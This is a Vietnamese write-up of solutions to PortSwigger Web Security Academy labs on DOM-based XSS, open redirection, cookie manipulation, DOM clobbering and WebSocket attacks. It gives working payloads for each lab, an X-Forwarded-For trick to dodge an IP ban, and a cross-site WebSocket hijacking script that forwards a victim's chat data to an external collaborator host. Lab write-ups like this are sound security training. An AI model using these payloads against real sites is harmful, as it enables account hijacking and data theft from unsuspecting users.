# Nguyễn Văn Thọ - Dom-based vulnerabilities & Websockets

<hr>

## DOM-Based Vulnerabilities

### DOM XSS using web messages

>![](https://i.imgur.com/C7fdaED.png)

Trang web chứa lỗ hổng ở `web message`, tìm cách khai thác và gọi hàm `print()`

Kiểm tra DOM của trang web, ta thấy có đoạn script như sau:

>![](https://i.imgur.com/F9c0mVw.png)

Đoạn code lắng nghe các message post tới (bởi các pop-up hay các iframe nó tạo ra - và ngược lại), và gọi hàm call back để nhét data nhận được vào thẻ `div` phía trên. 

Để có thể post message và kích hoạt sự kiện này, ta có thể dùng `window.postMessage`

>![](https://i.imgur.com/8x46yJ4.png)

Để khai thác, ta tạo 1 thẻ `iframe` với source là trang web đang nhắm tới, và gọi sự kiện `onload` để postMessage tới trang web mục tiêu.

```htmlembedded!
<iframe src="https://0a2300110414ab7cc07113a400cb0087.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=x onerror=print()>','*')">
```

Kết quả

>![](https://i.imgur.com/mhr7YaO.png)

<hr>

### DOM XSS using web messages and a JavaScript URL

>![](https://i.imgur.com/01p7cJ9.png)

Giống đề bài của bài trên.

Kiểm tra DOM của trang web, ta thấy có đoạn script như sau.

>![](https://i.imgur.com/7mQcVx7.png)

Nó thực hiện lắng nghe các message post tới, và kiểm tra điều kiện ***data phải chứa http hoặc https*** sau đó chuyển hướng tới url (giá trị của data) đó.

Lỗ hổng ở đây là nó chỉ kiểm tra data có chứa `http(s):` hay không chứ không phải là `data bắt đầu bằng http(s)`

payload khai thác:

```htmlembedded!
<iframe src="https://0a87005904ebc350c0a20e9f00510006.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http://','*')">
```

Kết quả:

>![](https://i.imgur.com/js1MHjX.png)

<hr>

### DOM XSS using web messages and JSON.parse

>![](https://i.imgur.com/CWoNRHe.png)

Bài lab này dùng json parse để phân tích message post tới.

Kiểm tra source của nó ta thấy nó phân tích như sau:

>![](https://i.imgur.com/u9DbkT9.png)

Nó tạo một thẻ `iframe`, parse json data, sau đó dựa theo switch-case mà xử lý data.

Ta thấy rằng khi `data.type` = "load-channel" thì nó sẽ load source của iframe từ url `data.url`

Vậy chỉ cần tạo 1 message dạng json, có 2 field là `type` và `url`, `type` sẽ có giá trị `load-channel` và `url` sẽ có giá trị là javascript url gọi tới hàm print()

```htmlembedded!
<iframe src='https://0ad0006604b9547ec0f9aada00bc0012.web-security-academy.net/' onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

>![](https://i.imgur.com/fDRqiYw.png)

Kết quả:

>![](https://i.imgur.com/y4BePCf.png)

<hr>

### DOM-based open redirection

>![](https://i.imgur.com/SJPQaUu.png)

Bài lab chứa lỗ hổng DOM-Based redirect khiến điều hướng trang web, tìm cách khai thác để redirect tới exploit server.

Kiểm tra 1 post bất kỳ, ta thấy phần `Back to blog` như sau:

```htmlembedded!
<div class="is-linkback">
<a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>
</div>
```

Nó thực hiện phân tích biến **`location`** để gán giá trị cho `returnURL`, sau đó chuyển tới đường dẫn parse được. Điều kiện là nạn nhân phải click.

Chỉ cần thêm tham số `url` vào đường dẫn là có thể thay đổi giá trị redirect của web khi click vào `Back to blog`

Trang web nhận data từ một nguồn attacker-controlled để xử lý cho các hàm sink -> dẫn tới lỗi.

payload:
```!
https://0a2800cd04f268a1c92e0f5100070080.web-security-academy.net/post?postId=6&url=https://exploit-0a59007c0414680bc9e80e1901f00070.exploit-server.net/#
```
Kết quả:

>![](https://i.imgur.com/P1WgI1y.png)

<hr>

### DOM-based cookie manipulation

>![](https://i.imgur.com/xVlERCH.png)

Tiêm một cookie có thể trigger `XSS` và gọi hàm `print()`

Kiểm tra cookie ta thấy có 1 trường là `lastViewProduct` có giá trị là url đến sản phẩm ta xem lần cuối.

>![](https://i.imgur.com/BBxbF3j.png)

Nó được set bởi đoạn code sau:

>![](https://i.imgur.com/DC1Rlgs.png)


Giá trị đó sẽ được nhúng vào chỗ này

>![](https://i.imgur.com/qJ6r0h9.png)

Thử thay đổi nó thành `javascript:alert(1)` ta nhận được kết quả như sau.

>![](https://i.imgur.com/lVSSB4n.png)

=> Trang web bị lỗi XSS

Vì link nằm trong cookie được nhúng vào DOM, nên ta thử escape với dấu `'` thêm vào url như payload sau, ta thấy trang web gọi hàm print()

```
&'><img src=x onerror=print()> 
```

>![](https://i.imgur.com/tPqY5MU.png)


Nhập payload sau vào exploit server và thực hiện delivery to victim 2 lần (lần 1 để lưu `lastViewProduct`, lần 2 để trigger xss):

```htmlembedded!
<iframe src="https://0a8a00bb04417c1cc7947d710076000a.web-security-academy.net/product?productId=1&'><img src=x onerror=print()>=1">
```

Kết quả:

>![](https://i.imgur.com/O7snttc.png)

***Hoặc có thể dùng thuộc tính onload gọi đến trang 1 lần nữa, để đảm bảo victim bị XSS***
<hr>

### Exploiting DOM clobbering to enable XSS

>![](https://i.imgur.com/TNqdXKJ.png)

Kiểm tra script của trang web, ta thấy các dòng code sau đáng chú ý

>![](https://i.imgur.com/tRMMVaK.png)

Nó gán avatar bằng object global là `defaultAvatar` (nếu tồn tại) hoặc là đường dẫn tới file như trong hình trên.

Object này sau đó được nhúng vào src của avatar và thêm vào DOM của web.

Vậy việc chức năng comment cho phép ta ghi vào comment với HTML sẽ cho phép ghi đè object này.

```!
<a id=defaultAvatar name=test><a id=defaultAvatar name=avatar src="x&quot;onerror=alert(1)//">
```

Khi dòng code truy vấn đến `window.defaultAvatar`, nó sẽ đọc đối tượng trong DOM và chấp nhận giá trị mà ta đã ghi đè vào. Để nó có thể đọc thuộc tính `avatar` ta tạo 2 đối tượng với id như nhau, sau đó 1 đối tượng có name=`avatar`

Kết quả:

>![](https://i.imgur.com/lGnCcMl.png)


<hr>

### Clobbering DOM attributes to bypass HTML filters

>![](https://i.imgur.com/VFbfIVI.png)

Xem đoạn javascript phía client, ta thấy trang web sử dụng HTML Janitor để whitelist các input được phép.

>![](https://i.imgur.com/vpsVtdh.png)

Theo đó nó chỉ cho các tag là: `Input`, `form`, `i`, `b`, `p`
Với các thuộc tính là:
* `Input`: `name`, `type`, `value`
* `form`: `id`
* `i`: `any`
* `b`: `any`
* `p`: `any`

Kiểm tra phần sanitize của Janitor, ta tìm được đoạn code như sau:

>![](https://i.imgur.com/Aaivg6I.png)

Vòng lặp này dùng để duyệt qua các attributes của 1 node và kiểm tra các thuộc tính đó có hợp lệ hay không, và việc này vô tình tạo ra lỗ hổng khi 1 thẻ `input` bên trong form với id=attributes có thể phá hỏng logic này.


Để tự động khai thác, ta sử dụng event `onfocus` rồi sau đó thêm fragment vào url, sự kiện sẽ tự động được focus -> tự động exploit.

Đầu tiên post 1 comment với nội dung như sau.
```!
<form id=x tabindex=0 onfocus=print()><input id=attributes>
```

Gửi đường dẫn tới nạn nhân như sau.
```!
<iframe src=https://0ab100f303dde946c1180d4500bc0078.web-security-academy.net/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#x',500)">

```

Kết quả:

>![](https://i.imgur.com/1MtfBLt.png)
 
<hr>

## Websockets

<hr>

### Manipulating WebSocket messages to exploit vulnerabilities

>![](https://i.imgur.com/FRY8nkt.png)

Bài lab có chức năng live chat sử dụng websocket, khai thác XSS để gọi hàm alert()

Kiểm tra chức năng `live chat` ta thấy với mỗi tin nhắn ta gửi qua, trang web sẽ thực hiện đẩy phần `content` của input vào DOM. 

Thử gửi nội dung `<img src=1 onerror='alert(1)'>` thấy kết quả không có gì, lý do là có đoạn code đã encode các ký tự của ta trước khi gửi đi khiến ko XSS được

>![](https://i.imgur.com/SiLp2vw.png)

Thử dùng Burp suite chặn các request và sửa đổi phần bị encode lại, kết quả khai thác thành công

>![](https://i.imgur.com/1bDiZwP.png)

<hr>

### Manipulating the WebSocket handshake to exploit vulnerabilities

>![](https://i.imgur.com/RpLC0YR.png)

Bài lab này có bổ xung thêm bộ lock XSS, tìm cách bypass và gọi hàm `alert()`

Thử XSS như bài trên, ta nhận được thông báo như sau

>![](https://i.imgur.com/haDtfhL.png)

Truy cập lại thì thấy IP đã bị banned :(

>![](https://i.imgur.com/PRwg3YY.png)

Fake địa chỉ IP bằng `X-Forwarded-For` thì thấy bypass được, thử lại payload kín hơn tí

```
<img src=1 oNeRrOr=alert`1`>
```

Kết quả:

>![](https://i.imgur.com/KxQYpI1.png)


<hr>

### Cross-site WebSocket hijacking

>![](https://i.imgur.com/Z5xTws7.png)

Phần mô tả giống bài lab trên, nhiệm vụ của bài này là `hijack websocket`.

Đọc phần lý thuyết, ta biết rằng nếu các handshake request chỉ xác thực dựa trên cookie session, thì khi attacker chiếm được cookie, sẽ chiếm được toàn bộ socket giao tiếp giữa nạn nhân và máy chủ.

Trình duyệt sẽ gửi cùng 1 cookie đến 1 site cho dù trang đó được mở ở các tab khác nhau, lợi dụng cơ chế đó ta tạo 1 trang web, ở đó sẽ dùng javascript gửi 1 request tới socket mục tiêu, trình duyệt sẽ mang theo cookie trong đó => coi như ta chiếm được session trong request gửi đi.

Kết quả nhận được trả về từ socket sẽ được forward ra máy chủ ngoài của ta.

Payload:
```javascript!
<script>
var webSocket = new WebSocket("wss://0a010069037be722c267763000290075.web-security-academy.net/chat");

webSocket.onopen = function () {
        webSocket.send("READY")
    }
webSocket.onmessage = function(event) {
        fetch('https://0648bqx3hdjhg3bx4pec94act3ztni.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
}
</script>
```
Kết quả:

>![](https://i.imgur.com/YNzYpda.png)


<hr>
